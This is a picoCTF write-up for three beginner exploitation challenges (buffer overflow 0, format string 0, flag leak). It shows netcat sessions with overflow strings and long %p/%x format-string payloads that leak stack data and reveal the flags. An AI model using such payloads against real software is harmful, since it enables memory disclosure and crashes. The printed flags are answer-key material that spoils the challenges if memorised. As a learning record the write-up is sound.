## 1. buffer overflow 0

### **Flag-**    
picoCTF{ov3rfl0ws_ar3nt_that_bad_9f2364bc}

### **Thought Process-**      
> I just read the c program and the challenge itself gave the clue that I had to buffer overflow in order to get the flag and I got it. I had to atleast input 20 bytes
  of string to get the flag because though the buffer `buf2` is of 16 bytes but the return address is of 4 bytes hence I required atleast 20 bytes of data to make the
  program to jump to `sigsegv_handler` to get the flag. 

**Working-**     
```bash
 nc saturn.picoctf.net 51209
Input: aefasjedfbnwpiusfgnhbasuiogbfiawsuefgbwyuoatefybawsiuefgawuifgebaweuoeyfbawsuifgvbaseufbnawuioyfgbwaOUEBFTGVAWIOUFTGBAWIUEFBAWIFEBWAISEFBWouiebfawoupeftgbawI(Ueghft9wpUHEF8AW7EGFBAWIEUEFGWaurfhbaw97ufhbawiuyerfhbaweiuughfw
picoCTF{ov3rfl0ws_ar3nt_that_bad_9f2364bc}
```

## 2. format string 0

### **Flag-**    
picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_ef312157}

### **Thought Process-**     
> It was sort of similar to the 1st challenge, after going through the program I understood here also I had to buffer overflow.

**Working-**    
```bash
 nc mimas.picoctf.net 61152
Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
Here comes the first customer Patrick who wants a giant bite.
Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
Enter your recommendation: Pe20021560_Portobellosdijhfbvsuydfobsdiyfbgsiyuefbsdyfbsuydfbsidjfbsduiyfbsidfvbsdfbn
There is no such burger yet!

picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_ef312157}
```

## 3. flag leak

### **Flag-**
picoCTF{L34k1ng_Fl4g_0ff_St4ck_11a2b52a}

### **Thought Process-**
> Here the vulnerability was because of `printf` statement because while printing it responds to certain format specifiers such as %p(to read addresses on the stack), 
  %s(To read the contents of strings stored at certain memory locations), %x(To print data in hexadecimal format). I tried combinations of all these specifiers to get the flag directly but it was getting difficult 
  to find out the flag address so directly used `%x` to get the hexadecmal values and find out the data by converting the hex data to ASCII. After several tries and observations I was able to find out the addrss 
  and the flag.

**Working-**     
```bash
:~$ nc saturn.picoctf.net 58085
Tell me a story and then I'll tell you one >> %p %p %p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p%p %p
Here's a story -
0xff9adf80
^C
:~$ nc saturn.picoctf.net 58085
Tell me a story and then I'll tell you one >> %p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
Here's a story -
0xff8b6be00xff8b6c000x80493460x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x2570250x6f6369700x7b4654430x6b34334c0x5f676e310x67346c460x6666305f0x3474535f0x315f6b630x623261310x7d6132350xfbad20000x68521800(nil)0xed6649900x804c0000x8049410(nil)0x804c0000xff8b6cc80x80494180x20xff8b6d740xff8b6d80(nil)0xff8b6ce0(nil)(nil)0xed45aed5
^C
:~$ nc saturn.picoctf.net 58085
Tell me a story and then I'll tell you one >> %p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p
Here's a story -
0xfff5e9600xfff5e9800x80493460x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x277025270x252770250x702527700x277025270x252770250x702527700x7025270x6f6369700x7b4654430x6b34334c0x5f676e310x67346c460x6666305f0x3474535f0x315f6b630x623261310x7d6132350xfbad20000x39666900(nil)0xf45d49900x804c000'0x8049410'(nil)'0x804c000'0xfff5ea48'0x8049418'0x2'0xfff5eaf4'0xfff5eb00'(nil)
^C
:~$ nc saturn.picoctf.net 58085
Tell me a story and then I'll tell you one >> %p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p'%p
Here's a story -
0xffc315d00xffc315f00x80493460x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x252770250x702527700x277025270x252770250x702527700x277025270x252770250x702527700x27702527'0x25277025'0x70252770'0x27702527'0x25277025'0x70252770'0x27702527'0x25277025'0x70252770'0x27702527'0x25277025'0x70252770'0x702527'0x6f636970'0x7b465443'0x6b34334c'0x5f676e31'0x67346c46'0x6666305f'0x3474535f'0x315f6b63'0x62326131'0x7d613235'0xfbad2000'0xc8709f00'(nil)'0xe801b990'0x804c000
^C
:~$ nc saturn.picoctf.net 58085
Tell me a story and then I'll tell you one >> %x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x?%x
Here's a story -
ff851200ff8512208049346782578257825782578257825782578257825782578257825782578257825782578257825782578253f78253f253f782578253f783f78253f253f782578253f783f78253f?253f7825?78253f78?3f78253f?253f7825?78253f78?3f78253f?253f7825?78253f78?3f78253f?253f7825?78253f78?3f78253f?253f7825?78253f78?78253f?6f636970?7b465443?6b34334c?5f676e31?67346c46?6666305f?3474535f?315f6b63?62326131?7d613235?fbad2000?29d9a000?0?e99d4990
```

**Tool-**      
![Rapid_Tables]

Here I figured out that I had to rearrange the flag as at the end of the flag `{` this should be there but I was shifted this helped to figure out the shifting.
